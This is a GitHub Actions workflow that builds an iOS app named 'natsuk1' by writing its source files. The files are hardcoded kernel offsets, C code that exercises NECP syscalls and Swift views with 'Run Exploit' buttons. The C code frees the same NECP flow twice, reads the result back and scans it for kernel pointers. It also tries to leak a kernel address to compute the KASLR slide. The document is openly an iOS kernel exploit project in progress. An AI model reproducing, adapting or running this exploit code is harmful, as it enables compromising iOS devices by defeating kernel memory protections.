name: Fix and Release

on:
  push:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: fix-release-${{ github.ref }}
  cancel-in-progress: false

jobs:
  fix-and-release:
    runs-on: macos-26
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0

      - uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: "26.5"

      - name: Remove legacy workflow
        run: |
          rm -f .github/workflows/build_and_release.yml
          rm -f natsuk1/Views/SimpleList.swift

      - name: Write nk_offsets.h
        run: |
          cat > natsuk1/Exploit/nk_offsets.h <<'EOF'
          #ifndef NK_OFFSETS_H
          #define NK_OFFSETS_H

          #define NK_KERNEL_BASE                0xFFFFFFF007004000ULL
          #define NK_SYSENT_BASE                0xFFFFFFF007C192A0ULL
          #define NK_SYSENT_COUNT               558
          #define NK_SLIDE_FALLBACK             0x3D00000ULL

          #define NK_NECP_OPEN                  0xFFFFFFF00A4E411CULL
          #define NK_NECP_CLIENT_ACTION         0xFFFFFFF00A4E5C28ULL
          #define NK_NECP_ADD_CLIENT            0xFFFFFFF00A4E60DCULL
          #define NK_NECP_REMOVE_CLIENT         0xFFFFFFF00A4E76F4ULL
          #define NK_NECP_COPY_RESULT           0xFFFFFFF00A4E7BE8ULL
          #define NK_NECP_COPY_RESULT_INNER     0xFFFFFFF00A4F26F0ULL
          #define NK_NECP_COPY_LIST             0xFFFFFFF00A4E80FCULL
          #define NK_NECP_ADD_FLOW              0xFFFFFFF00A4E843CULL
          #define NK_NECP_REMOVE_FLOW           0xFFFFFFF00A4E93C4ULL
          #define NK_NECP_COPY_INTERFACE        0xFFFFFFF00A4EAC7CULL
          #define NK_NECP_SYSCTL_ARENA          0xFFFFFFF00A4EB704ULL
          #define NK_NECP_COPY_UPDATE           0xFFFFFFF00A4EC264ULL
          #define NK_NECP_GET_TLV_AT_OFFSET     0xFFFFFFF00A4C2034ULL

          #define NK_NECP_OP_ADD_CLIENT         0x01
          #define NK_NECP_OP_REMOVE_CLIENT      0x02
          #define NK_NECP_OP_COPY_RESULT        0x03
          #define NK_NECP_OP_COPY_RESULT_ALT    0x04
          #define NK_NECP_OP_COPY_LIST          0x05
          #define NK_NECP_OP_REQUEST_NEXUS      0x06
          #define NK_NECP_OP_AGENT_ACTION       0x07
          #define NK_NECP_OP_COPY_AGENT         0x08
          #define NK_NECP_OP_COPY_INTERFACE     0x09
          #define NK_NECP_OP_COPY_ROUTE_STATS   0x0B
          #define NK_NECP_OP_COPY_PARAMETERS    0x0C
          #define NK_NECP_OP_SYSCTL_ARENA       0x0D
          #define NK_NECP_OP_UPDATE_CACHE       0x0E
          #define NK_NECP_OP_COPY_UPDATE        0x0F
          #define NK_NECP_OP_COPY_RESULT_LONG   0x10
          #define NK_NECP_OP_ADD_FLOW           0x11
          #define NK_NECP_OP_REMOVE_FLOW        0x12
          #define NK_NECP_OP_CLAIM              0x13
          #define NK_NECP_OP_SIGN               0x14
          #define NK_NECP_OP_GET_IFACE_ADDR     0x15
          #define NK_NECP_OP_COPY_AGENT_ALT     0x16
          #define NK_NECP_OP_VALIDATE           0x17
          #define NK_NECP_OP_GET_SIGNED_ID      0x18
          #define NK_NECP_OP_SET_SIGNED_ID      0x19
          #define NK_NECP_OP_COPY_RESULT_LONG2  0x1A
          #define NK_NECP_OP_GET_FLOW_STATS     0x1B

          #define NK_FN_COPYIN                  0xFFFFFFF00A368EC0ULL
          #define NK_FN_COPYOUT                 0xFFFFFFF00A369A3CULL
          #define NK_FN_KALLOC_TYPE             0xFFFFFFF00A200988ULL
          #define NK_FN_KFREE_TYPE              0xFFFFFFF00A201000ULL

          #define NK_KALLOC_TYPE_NECP_FLOW      0xFFFFFFF007C62E68ULL

          #endif
          EOF

      - name: Write necp.c
        run: |
          cat > natsuk1/Exploit/necp.c <<'EOF'
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <stdint.h>
          #include <stdbool.h>
          #include <stdarg.h>
          #include <unistd.h>
          #include <errno.h>
          #include <sys/syscall.h>
          #include <mach/mach.h>
          #include <mach/message.h>

          #include "nk_api.h"
          #include "nk_offsets.h"

          #ifndef SYS_NECP_OPEN
          #define SYS_NECP_OPEN 501
          #endif
          #ifndef SYS_NECP_ACTION
          #define SYS_NECP_ACTION 502
          #endif

          #define KBASE 0xFFFFFFF007004000ULL
          #define KPTR_MIN 0xFFFFFFF000000000ULL
          #define KPTR_MAX 0xFFFFFFFFFF000000ULL

          #define NECP_ADD_CLIENT 0x01
          #define NECP_COPY_RESULT 0x04
          #define NECP_ADD_FLOW 0x11
          #define NECP_REMOVE_FLOW 0x12
          #define NECP_SYSCTL_ARENA 0x0D
          #define GATE_BYTE 9

          #define RESBUF 8192

          static volatile int g_busy = 0;
          static volatile int g_cancel = 0;

          static void lg(const char *tag, const char *sign, const char *fmt, ...) {
              char body[448];
              va_list ap;
              va_start(ap, fmt);
              vsnprintf(body, sizeof(body), fmt, ap);
              va_end(ap);
              char out[512];
              snprintf(out, sizeof(out), "%s%s", sign, body);
              nk_logx(tag, "%s", out);
          }
          #define LI(t, ...) lg(t, "", __VA_ARGS__)
          #define LO(t, ...) lg(t, "+ ", __VA_ARGS__)
          #define LE(t, ...) lg(t, "- ", __VA_ARGS__)
          #define LW(t, ...) lg(t, "! ", __VA_ARGS__)
          #define LR(t, ...) lg(t, "> ", __VA_ARGS__)

          static int is_kptr(uint64_t v) { return v >= KPTR_MIN && v <= KPTR_MAX; }
          static int is_user_va(uint64_t v) { return v >= 0x100000000ULL && v < 0x800000000000ULL; }

          static int nfd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }

          static int nadd_client(int fd, uint8_t uuid[16]) {
              uint8_t p[1] = {0};
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT,
                                  uuid, (size_t)16, p, (size_t)1);
          }

          static int nadd_flow(int fd, const uint8_t cu[16], uint8_t fu[16]) {
              uint8_t req[56];
              memset(req, 0, sizeof(req));
              memcpy(req + 0x10, cu, 16);
              *(uint16_t*)(req + 0x20) = 0x0040;
              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW,
                                   (void*)cu, (size_t)16, req, (size_t)56);
              if (r == 0) {
                  memcpy(fu, req, 16);
                  fu[GATE_BYTE] |= 0x01;
              }
              return r;
          }

          static int nrm_flow(int fd, const uint8_t fu[16]) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW,
                                  (void*)fu, (size_t)16, NULL, (size_t)0);
          }

          static int ncpy_result(int fd, const uint8_t cu[16], uint8_t *b, size_t bl) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT,
                                  (void*)cu, (size_t)16, b, (uint32_t)bl);
          }

          static int nleak_kva(int fd, uint64_t *out) {
              return (int)syscall(SYS_NECP_ACTION, fd, NECP_SYSCTL_ARENA,
                                  (void*)0, (size_t)0, (void*)out, (size_t)8);
          }

          static void hexdump(const char *tag, const uint8_t *buf, int len, int max) {
              if (len > max) len = max;
              for (int i = 0; i < len; i += 16) {
                  char hex[96];
                  snprintf(hex, sizeof(hex),
                      "%04x: %02x%02x%02x%02x %02x%02x%02x%02x "
                      "%02x%02x%02x%02x %02x%02x%02x%02x",
                      i,
                      buf[i+0], buf[i+1], buf[i+2], buf[i+3],
                      buf[i+4], buf[i+5], buf[i+6], buf[i+7],
                      buf[i+8], buf[i+9], buf[i+10], buf[i+11],
                      buf[i+12], buf[i+13], buf[i+14], buf[i+15]);
                  LI(tag, "%s", hex);
              }
          }

          static int scan_kptr(const char *tag, const uint8_t *buf, int len) {
              int found = 0;
              for (int i = 0; i + 8 <= len; i += 8) {
                  uint64_t v;
                  memcpy(&v, buf + i, 8);
                  if (is_kptr(v)) {
                      LO(tag, "[%04x] = 0x%llx", i, (unsigned long long)v);
                      found++;
                      if (found >= 16) break;
                  }
              }
              return found;
          }

          static int step_copy_result(void) {
              nk_log("");
              LI("S1", "copy_result: add_client + add_flow + remove x2 + copy_result");
              int fd = nfd();
              if (fd < 0) { LE("S1", "open errno=%d", errno); return -1; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              int r = nadd_client(fd, cu);
              LI("S1", "add_client=%d", r);
              if (r != 0) { close(fd); return -1; }
              uint8_t fu[16];
              r = nadd_flow(fd, cu, fu);
              LI("S1", "add_flow=%d", r);
              if (r != 0) { close(fd); return -1; }
              int r1 = nrm_flow(fd, fu);
              int r2 = nrm_flow(fd, fu);
              LI("S1", "remove#1=%d remove#2=%d", r1, r2);
              uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
              int c = ncpy_result(fd, cu, buf, sizeof(buf));
              LI("S1", "copy_result=%d bytes", c);
              close(fd);
              if (c > 0) {
                  LI("S1", "hexdump:");
                  hexdump("S1H", buf, c, 256);
                  int nk = scan_kptr("S1K", buf, c);
                  LI("S1", "kptr count = %d", nk);
                  if (nk == 0) LR("S1", "no kernel pointers in returned buffer");
              }
              return c;
          }

          static int step_sysctl_arena(void) {
              nk_log("");
              LI("S2", "sysctl_arena: add_client + op=0x0D");
              int fd = nfd();
              if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              int r = nadd_client(fd, cu);
              LI("S2", "add_client=%d", r);
              if (r != 0) { close(fd); return -1; }
              uint64_t val = 0;
              int rc = nleak_kva(fd, &val);
              LI("S2", "op=0x0D rc=%d value=0x%llx", rc, (unsigned long long)val);
              close(fd);
              if (rc != 0) { LE("S2", "op failed rc=%d", rc); return -1; }
              if (is_kptr(val)) {
                  LO("S2", "kernel pointer: 0x%llx", (unsigned long long)val);
                  uint64_t slide = val - KBASE;
                  LO("S2", "slide = 0x%llx", (unsigned long long)slide);
                  LO("S2", "base  = 0x%llx", (unsigned long long)(KBASE + slide));
                  return 0;
              }
              if (is_user_va(val)) {
                  LW("S2", "value is user VA: 0x%llx", (unsigned long long)val);
                  LR("S2", "arena mapped into our space, not a leak");
                  return 0;
              }
              LW("S2", "value out of known ranges: 0x%llx", (unsigned long long)val);
              return -1;
          }

          static int step_copy_result_op3(void) {
              nk_log("");
              LI("S3", "copy_result op=0x03 variant");
              int fd = nfd();
              if (fd < 0) { LE("S3", "open errno=%d", errno); return -1; }
              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
              uint8_t fu[16];
              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
              uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
                                   (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
              LI("S3", "op=0x03 returned %d bytes", c);
              close(fd);
              if (c > 0) {
                  hexdump("S3H", buf, c, 256);
                  int nk = scan_kptr("S3K", buf, c);
                  LI("S3", "kptr count = %d", nk);
              }
              return c;
          }

          static int impl(void) {
              nk_log("");
              nk_log("================================================================");
              nk_log("natsuk1 v4.4 — NECP recon");
              nk_log("iOS 27.0 / iPhone14,5 / 24A437");
              nk_log("================================================================");
              nk_log("");
              int fd = nfd();
              if (fd < 0) { LE("PRE", "necp_open errno=%d", errno); return 1; }
              close(fd);
              LO("PRE", "necp_open OK");
              step_copy_result();
              step_sysctl_arena();
              step_copy_result_op3();
              nk_log("");
              nk_log("======== done ========");
              return 0;
          }

          int nk_necp_run(void) {
              if (__sync_lock_test_and_set(&g_busy, 1)) {
                  nk_log("[!] already running");
                  return 1;
              }
              g_cancel = 0;
              int rc = impl();
              __sync_lock_release(&g_busy);
              return rc;
          }

          void nk_necp_cancel(void) {
              g_cancel = 1;
              nk_log("[!] cancel requested");
          }
          EOF

      - name: Write natsuk1.swift
        run: |
          cat > natsuk1/natsuk1.swift <<'EOF'
          import SwiftUI
          import UIKit
          import Foundation

          final class LockedBuffer: @unchecked Sendable {
              nonisolated(unsafe) static let shared = LockedBuffer()
              private let lock = NSLock()
              private var value: String = ""
              private init() {}
              func append(_ s: String) {
                  lock.lock(); value += s + "\n"
                  if value.count > 10000 { value = String(value.suffix(6000)) }
                  lock.unlock()
              }
              func drain() -> String { lock.lock(); let v = value; value = ""; lock.unlock(); return v }
              func clear() { lock.lock(); value = ""; lock.unlock() }
          }

          private let cCallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { line in
              guard let line = line else { return }
              var bytes: [UInt8] = []
              var p = line
              while p.pointee != 0 { bytes.append(UInt8(bitPattern: p.pointee)); p = p.advanced(by: 1) }
              let _line = String(decoding: bytes, as: UTF8.self)
              LockedBuffer.shared.append(_line)
              CrashLog.shared.writeLine(_line)
              AppState.shared.parseLogLine(_line)
          }

          private func osVersionString() -> String {
              let v = ProcessInfo.processInfo.operatingSystemVersion
              return "\(v.majorVersion).\(v.minorVersion)"
          }
          private func appVersionString() -> String {
              Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
          }

          @main
          struct natsuk1App: App {
              var body: some Scene { WindowGroup { RootView() } }
          }

          struct RootView: View {
              @StateObject private var state = AppState.shared
              @StateObject private var offsets = OffsetsStore.shared
              @StateObject private var airlift = AirliftBridge.shared
              @AppStorage("auto_run") private var auto_run = false
              @AppStorage("keep_alive_audio") private var keep_alive_audio = false
              @AppStorage("keep_alive_location") private var keep_alive_location = false
              @Environment(\.scenePhase) private var scenePhase

              init() {
                  UserDefaults.standard.register(defaults: [
                      "auto_run": false, "keep_alive_audio": false,
                      "keep_alive_location": false, "lang": "en"])
              }

              var body: some View {
                  ContentView()
                      .environmentObject(state)
                      .environmentObject(offsets)
                      .environmentObject(airlift)
                      .onAppear {
                          CrashLog.shared.install()
                          if let prev = CrashLog.shared.recoverPreviousSession(), !prev.isEmpty {
                              AppState.shared.previousCrash = prev
                          }
                          nk_set_log(cCallback)
                          if state.log.isEmpty {
                              state.append("[*] natsuk1 v\(appVersionString())")
                              state.append("[*] iOS \(osVersionString()) / arm64e")
                              state.append("")
                          }
                          if keep_alive_audio { KeepAlive.shared.startAudio() }
                          if keep_alive_location { KeepAlive.shared.startLocation() }
                          if auto_run {
                              DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { state.run() }
                          }
                      }
                      .onChange(of: keep_alive_audio) { _, v in
                          if v { KeepAlive.shared.startAudio() } else { KeepAlive.shared.stopAudio() }
                      }
                      .onChange(of: keep_alive_location) { _, v in
                          if v { KeepAlive.shared.startLocation() } else { KeepAlive.shared.stopLocation() }
                      }
                      .onChange(of: scenePhase) { _, phase in
                          if phase == .background {
                              CrashLog.shared.markCleanShutdown()
                          }
                      }
              }
          }

          @MainActor
          final class AppState: ObservableObject {
              @Published var slide: String = "—"
              @Published var base: String = "—"
              @Published var previousCrash: String? = nil
              @Published var showCrashLog: Bool = false

              nonisolated func parseLogLine(_ line: String) {
                  if let v = Self.extractHex(line, keys: ["slide=0x", "SLIDE = 0x", "slide = 0x"]) {
                      Task { @MainActor in
                          if AppState.shared.slide != v { AppState.shared.slide = v }
                      }
                  }
                  if let v = Self.extractHex(line, keys: ["base=0x", "BASE = 0x", "base = 0x"]) {
                      Task { @MainActor in
                          if AppState.shared.base != v { AppState.shared.base = v }
                      }
                  }
              }

              nonisolated private static func extractHex(_ s: String, keys: [String]) -> String? {
                  for k in keys {
                      if let r = s.range(of: k) {
                          var hex = ""
                          for c in s[r.upperBound...] {
                              if c.isHexDigit { hex.append(c) } else { break }
                          }
                          if !hex.isEmpty { return "0x" + hex }
                      }
                  }
                  return nil
              }
              static let shared = AppState()
              enum Status {
                  case idle, running, ok, failed
                  var color: Color {
                      switch self {
                      case .idle: return .secondary
                      case .running: return .orange
                      case .ok: return .green
                      case .failed: return .red
                      }
                  }
              }
              @Published var log: String = ""
              @Published var status: Status = .idle
              @Published var running: Bool = false
              @Published var show_respring: Bool = false
              @Published var lang: String { didSet { UserDefaults.standard.set(lang, forKey: "lang") } }
              private var flusher: Timer?

              init() {
                  self.lang = UserDefaults.standard.string(forKey: "lang") ?? "en"
                  startFlusher()
              }
              func t(_ en: String, _ ru: String) -> String { lang == "ru" ? ru : en }

              private func startFlusher() {
                  flusher?.invalidate()
                  flusher = Timer.scheduledTimer(withTimeInterval: 0.3, repeats: true) { [weak self] _ in
                      guard let self else { return }
                      let chunk = LockedBuffer.shared.drain()
                      guard !chunk.isEmpty else { return }
                      var newLog = self.log
                      newLog += chunk
                      if newLog.count > 30000 { newLog = String(newLog.suffix(20000)) }
                      self.log = newLog
                  }
              }
              func append(_ s: String) { LockedBuffer.shared.append(s) }
              func run() {
                  if running { return }
                  running = true; status = .running
                  Task.detached {
                      _ = nk_full_exploit()
                      await MainActor.run {
                          AppState.shared.running = false
                          AppState.shared.status = .ok
                      }
                  }
              }
              func necp_run() {
                  if running { return }
                  running = true; status = .running
                  Task.detached {
                      let rc = nk_necp_run()
                      await MainActor.run {
                          AppState.shared.running = false
                          AppState.shared.status = (rc == 0) ? .ok : .failed
                      }
                  }
              }
              func respring() {
                  guard let scene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
                        let window = scene.windows.first(where: { $0.isKeyWindow }) ?? scene.windows.first,
                        let root = window.rootViewController else { return }
                  let host = UIHostingController(rootView: RespringView().ignoresSafeArea())
                  host.modalPresentationStyle = .fullScreen
                  root.present(host, animated: false)
              }
              func clear() { LockedBuffer.shared.clear(); log = "" }
              func cancel() {
                  nk_necp_cancel()
                  append("[*] cancel requested")
              }
          }
          EOF

      - name: Write ContentView.swift
        run: |
          cat > natsuk1/Views/ContentView.swift <<'EOF'
          import SwiftUI

          struct ContentView: View {
              @EnvironmentObject var state: AppState
              var body: some View {
                  TabView {
                      OverviewView()
                          .tabItem { Label(state.t("Overview", "Обзор"), systemImage: "square.grid.2x2") }
                      ToolsView()
                          .tabItem { Label(state.t("Tools", "Инструменты"), systemImage: "hammer") }
                      SettingsView()
                          .tabItem { Label(state.t("Settings", "Настройки"), systemImage: "gearshape.fill") }
                  }
                  .tint(.accentColor)
                  .onReceive(NotificationCenter.default.publisher(for: Notification.Name("natsuk1.respring"))) { _ in
                      state.respring()
                  }
              }
          }
          EOF

      - name: Write OverviewView.swift
        run: |
          cat > natsuk1/Views/OverviewView.swift <<'EOF'
          import SwiftUI
          import UIKit

          struct OverviewView: View {
              @EnvironmentObject var state: AppState
              @State private var copied = false

              var body: some View {
                  NavigationStack {
                      List {
                          Section {
                              Button { state.necp_run() } label: {
                                  HStack {
                                      Text("Run Exploit")
                                      Spacer()
                                      ProgressView().opacity(state.running ? 1 : 0)
                                  }
                              }
                              .disabled(state.running)

                              Button(role: .destructive) { state.cancel() } label: {
                                  Text("Cancel Exploit")
                              }
                              .disabled(!state.running)
                          } header: {
                              Label("Exploit", systemImage: "cpu")
                          }

                          RuntimeView()
                              .environmentObject(state)

                          Section {
                              LogTerminal(text: state.log.isEmpty ? "Awaiting execution." : state.log)
                          } header: {
                              Label(state.t("Logs", "Логи"), systemImage: "terminal")
                          }

                          Section {
                              Button {
                                  UIPasteboard.general.string = state.log
                                  copied = true
                                  DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                                      copied = false
                                  }
                              } label: {
                                  Text(copied ? "Copied!" : state.t("Copy All", "Копировать всё"))
                              }
                              .disabled(state.log.isEmpty)

                              Button(role: .destructive) { state.clear() } label: {
                                  Text(state.t("Clear", "Очистить"))
                              }
                              .disabled(state.log.isEmpty)
                          } header: {
                              Label("Log Actions", systemImage: "document.on.document")
                          }
                      }
                      .listStyle(.insetGrouped)
                      .navigationTitle("natsuk1")
                      .navigationBarTitleDisplayMode(.inline)
                  }
              }
          }

          struct StatusDot: View {
              let status: AppState.Status
              @State private var pulse = false
              var body: some View {
                  Image(systemName: "circle.fill")
                      .font(.system(size: 14))
                      .foregroundStyle(status.color)
                      .shadow(color: status.color.opacity(0.85), radius: pulse ? 8 : 4)
                      .animation(
                          status == .running
                              ? .easeInOut(duration: 0.8).repeatForever(autoreverses: true)
                              : .default,
                          value: pulse
                      )
                      .onAppear { if status == .running { pulse = true } }
                      .onChange(of: status) { _, s in pulse = (s == .running) }
              }
          }

          struct LogTerminal: View {
              let text: String
              var body: some View {
                  ScrollView {
                      Text(text)
                          .font(.system(size: 10, design: .monospaced))
                          .multilineTextAlignment(.leading)
                          .foregroundStyle(.primary)
                          .frame(maxWidth: .infinity, alignment: .leading)
                  }
                  .frame(minHeight: 200, maxHeight: 400)
              }
          }
          EOF

